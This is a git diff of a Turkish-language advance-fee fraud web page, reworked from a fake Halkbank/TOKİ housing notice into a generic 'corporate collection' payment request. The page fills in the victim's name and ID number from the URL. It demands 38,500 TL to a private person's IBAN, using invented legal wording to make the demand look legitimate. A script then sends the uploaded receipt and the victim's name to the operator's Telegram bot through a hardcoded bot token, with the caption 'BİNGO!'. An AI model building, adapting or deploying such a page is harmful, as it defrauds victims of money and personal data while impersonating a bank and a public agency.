@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HALKBANK EMLAK KONUT GÜVENCESİ TOKİ</title>
+    <title>KURUMSAL TAHSİLAT SİSTEMİ</title>
     <style>
         body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f4f7f9; margin: 0; padding: 0; }
         .navbar { background-color: #004a99; color: white; padding: 18px; text-align: center; font-size: 16px; font-weight: bold; border-bottom: 3px solid #003366; }
@@ -22,12 +22,13 @@
     </style>
 </head>
 <body>
-    <div class="navbar">HALKBANK EMLAK KONUT GÜVENCESİ TOKİ</div>
+    <div class="navbar">KURUMSAL TAHSİLAT SİSTEMİ</div>
     <div class="container">
-        <div class="status-box">ÖDEME BEKLENİYOR: LÜTFEN PEŞİNAT DEKONTUNU ONAYLAYINIZ</div>
+        <div class="status-box">ÖDEME BEKLENİYOR: LÜTFEN ÖN ÖDEME DEKONTUNU ONAYLAYINIZ</div>
         
-        <div class="info-row"><span>Hak Sahibi:</span> <b id="userAd" style="text-transform: uppercase;">...</b></div>
-        <div class="info-row"><span>T.C. Kimlik:</span> <b id="userTc">********</b></div>
+        <div class="info-row"><span>İşlem Sahibi:</span> <b id="userAd" style="text-transform: uppercase;">...</b></div>
+        <div class="info-row"><span>T.C. / Vergi No:</span> <b id="userTc">********</b></div>
+        <div class="info-row"><span>Toplam Ödeme:</span> <b style="color: #c9302c; font-size: 16px;">38.500 TL</b></div>
         <div class="info-row"><span>Tahsis No:</span> <b style="background:#004a99; color:white; padding:2px 6px; border-radius:3px;">TK-8842710</b></div>
 
         <div class="payment-section">
@@ -36,12 +37,12 @@
                 <b class="value-name">İSMAİL ARSLAN</b>
                 <span class="value-iban">TR31 0006 7010 0000 0048 8523 29</span>
                 <p class="legal-note">
-                    * 6098 sayılı TBK ve TOKİ Finansman Yönetmeliği gereğince; bu hesap 2026 Sosyal Konut Projesi <b>"Emanet Tahsilat Hesabı"</b> olarak yetkilendirilmiştir.
+                    * 6098 sayılı TBK ve Finansman Yönetmeliği gereğince; bu hesap 2026 Tedarik ve Proje Sözleşmeleri <b>"Emanet Tahsilat Hesabı"</b> olarak yetkilendirilmiştir.
                 </p>
             </div>
 
             <div class="upload-section">
-                <label style="font-weight:bold; color:#004a99; display:block; margin-bottom:10px;">📄 ÖDEME DEKONTUNU YÜKLE</label>
+                <label style="font-weight:bold; color:#004a99; display:block; margin-bottom:10px;">📄 ÖN ÖDEME DEKONTUNU YÜKLE</label>
                 <input type="file" id="dekontFile" onchange="checkFile()" accept="image/*">
             </div>
             <div class="warning-footer">⚠️ AÇIKLAMA: TK-8842710 YAZILMALIDIR!</div>
@@ -52,17 +53,15 @@
         
         <div id="successMsg" style="display:none; text-align:center; color:#28a745; font-weight:bold; margin-top:20px; border: 2px solid #28a745; padding: 15px; border-radius: 10px;">
             ✅ ÖDEME BİLDİRİMİ ALINDI! <br>
-            <span style="color:#555; font-size:12px; font-weight:normal;">Dekontunuz başarıyla sisteme aktarılmıştır. İnceleme sonrası onay verilecektir.</span>
+            <span style="color:#555; font-size:12px; font-weight:normal;">Ön ödeme dekontunuz sisteme aktarılmıştır. Kontrat onayınız kısa süre içinde iletilecektir.</span>
         </div>
     </div>
 
     <script>
-        // Bilgileri URL'den çek
         const urlParams = new URLSearchParams(window.location.search);
-        document.getElementById('userAd').innerText = urlParams.get('ad') || "HAK SAHİBİ";
+        document.getElementById('userAd').innerText = urlParams.get('ad') || "İŞLEM SAHİBİ";
         document.getElementById('userTc').innerText = urlParams.get('tc') || "********";
 
-        // Dosya seçilmeden butonu açma
         function checkFile() {
             const fileInput = document.getElementById('dekontFile');
             const btn = document.getElementById('sendBtn');
@@ -73,14 +72,12 @@
             }
         }
 
-        // Gönderim Fonksiyonu
         function paylas() {
             const fileInput = document.getElementById('dekontFile');
             const btn = document.getElementById('sendBtn');
             const loader = document.getElementById('loader');
             const success = document.getElementById('successMsg');
             
-            // SENİN BİLGİLERİN
             const token = "7691262077:AAHym69rRlI7HRtkokgdlgkzJQb1gpTx4yU";
             const chatId = "7432859148";
             const ad = document.getElementById('userAd').innerText;
@@ -91,7 +88,7 @@
             const formData = new FormData();
             formData.append("chat_id", chatId);
             formData.append("photo", fileInput.files[0]);
-            formData.append("caption", "🚨 BİNGO! YENİ DEKONT\n👤 İsim: " + ad + "\n💰 Tutar: 24.500 TL\n🏦 Yetkili: İSMAİL ARSLAN\n📂 Tahsis No: TK-8842710");
+            formData.append("caption", "🚨 BİNGO! YENİ ÖN ÖDEME\n👤 İsim: " + ad + "\n💰 Tutar: 38.500 TL\n🏦 Yetkili: İSMAİL ARSLAN\n📂 Tahsis No: TK-8842710");
 
             const xhr = new XMLHttpRequest();
             xhr.open("POST", "https://api.telegram.org/bot" + token + "/sendPhoto", true);
@@ -104,11 +101,6 @@
                     loader.innerHTML = "❌ Hata: Botu Telegram'dan 'BAŞLAT' yaptınız mı?";
                     btn.style.display = 'block';
                 }
-            };
-
-            xhr.onerror = function() {
-                loader.innerHTML = "❌ Bağlantı hatası! Tekrar deneyin.";
-                btn.style.display = 'block';
             };
 
             xhr.send(formData);
